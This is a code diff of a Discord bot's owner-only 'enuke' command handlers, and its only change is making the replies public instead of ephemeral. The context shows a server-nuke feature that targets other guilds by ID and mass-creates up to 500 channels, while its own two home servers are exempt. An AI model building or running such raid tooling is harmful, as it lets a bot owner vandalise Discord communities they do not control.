@@ -84,7 +84,7 @@ export const commands = [
     },
     // No slash version
     async executeSlash(interaction) {
-      return interaction.reply({ embeds: [embed.danger('Access Denied', 'This command is only available as a prefix command.')], flags: 64 });
+      return interaction.reply({ embeds: [embed.danger('Access Denied', 'This command is only available as a prefix command.')] });
     }
   }
 ];
@@ -99,18 +99,18 @@ export async function handleEnukeButton(interaction) {
   
   // Only the bot owner can use this
   if (!isBotOwnerSync(interaction.user.id)) {
-    return interaction.reply({ content: '️ Access Denied. Only the Bot Owner can use this.', flags: 64 });
+    return interaction.reply({ content: '️ Access Denied. Only the Bot Owner can use this.' });
   }
 
   const sessionKey = `enuke_${interaction.user.id}`;
   const target = enukeTargets.get(sessionKey);
   
   if (!target) {
-    return interaction.reply({ content: ' Session expired. Please run the `enuke` command again.', flags: 64 });
+    return interaction.reply({ content: ' Session expired. Please run the `enuke` command again.' });
   }
 
   if (['1436790385266393142', '1511630038045294662'].includes(target.guildId)) {
-    return interaction.reply({ content: ' This is a protected Home Server. Enuke is permanently disabled here.', flags: 64 });
+    return interaction.reply({ content: ' This is a protected Home Server. Enuke is permanently disabled here.' });
   }
 
   // Build the modal
@@ -169,18 +169,18 @@ export async function handleEnukeModal(interaction) {
   
   // Only the bot owner can use this
   if (!isBotOwnerSync(interaction.user.id)) {
-    return interaction.reply({ content: '️ Access Denied.', flags: 64 });
+    return interaction.reply({ content: '️ Access Denied.' });
   }
 
   const sessionKey = `enuke_${interaction.user.id}`;
   const target = enukeTargets.get(sessionKey);
 
   if (!target) {
-    return interaction.reply({ content: ' Session expired. Please run the `enuke` command again.', flags: 64 });
+    return interaction.reply({ content: ' Session expired. Please run the `enuke` command again.' });
   }
 
   if (['1436790385266393142', '1511630038045294662'].includes(target.guildId)) {
-    return interaction.reply({ content: ' This is a protected Home Server. Enuke is permanently disabled here.', flags: 64 });
+    return interaction.reply({ content: ' This is a protected Home Server. Enuke is permanently disabled here.' });
   }
 
   // Parse modal fields
@@ -192,28 +192,28 @@ export async function handleEnukeModal(interaction) {
   // Validate
   const mode = parseInt(modeStr);
   if (![1, 2, 3].includes(mode)) {
-    return interaction.reply({ embeds: [embed.danger('Invalid Mode', 'Mode must be `1`, `2`, or `3`.')], flags: 64 });
+    return interaction.reply({ embeds: [embed.danger('Invalid Mode', 'Mode must be `1`, `2`, or `3`.')] });
   }
 
   const channelCount = parseInt(channelCountStr);
   if (isNaN(channelCount) || channelCount < 0 || channelCount > 500) {
-    return interaction.reply({ embeds: [embed.danger('Invalid Count', 'Channels to create must be between `0` and `500`.')], flags: 64 });
+    return interaction.reply({ embeds: [embed.danger('Invalid Count', 'Channels to create must be between `0` and `500`.')] });
   }
 
   if (confirmStr !== 'CONFIRM') {
-    return interaction.reply({ embeds: [embed.danger('Aborted', 'You must type `CONFIRM` exactly to proceed. Nuke sequence aborted.')], flags: 64 });
+    return interaction.reply({ embeds: [embed.danger('Aborted', 'You must type `CONFIRM` exactly to proceed. Nuke sequence aborted.')] });
   }
 
   // Clean up session
   enukeTargets.delete(sessionKey);
 
   // Acknowledge the modal
-  await interaction.reply({ embeds: [embed.danger(' Nuke Sequence Initiated', `Target: **${target.guildName}** (\`${target.guildId}\`)\nMode: **${mode}** | Channels to create: **${channelCount}** | Name: **${channelName}**\n\n Executing...`)], flags: 64 });
+  await interaction.reply({ embeds: [embed.danger(' Nuke Sequence Initiated', `Target: **${target.guildName}** (\`${target.guildId}\`)\nMode: **${mode}** | Channels to create: **${channelCount}** | Name: **${channelName}**\n\n Executing...`)] });
 
   // Resolve the guild
   const guild = interaction.client.guilds.cache.get(target.guildId);
   if (!guild) {
-    return interaction.followUp({ content: ' Guild no longer accessible.', flags: 64 });
+    return interaction.followUp({ content: ' Guild no longer accessible.' });
   }
 
   // Execute the nuke
@@ -234,7 +234,7 @@ export async function handleEnukeModal(interaction) {
     ]
   });
 
-  await interaction.followUp({ embeds: [resultEmbed], flags: 64 }).catch(() => null);
+  await interaction.followUp({ embeds: [resultEmbed] }).catch(() => null);
 }
 
 /**
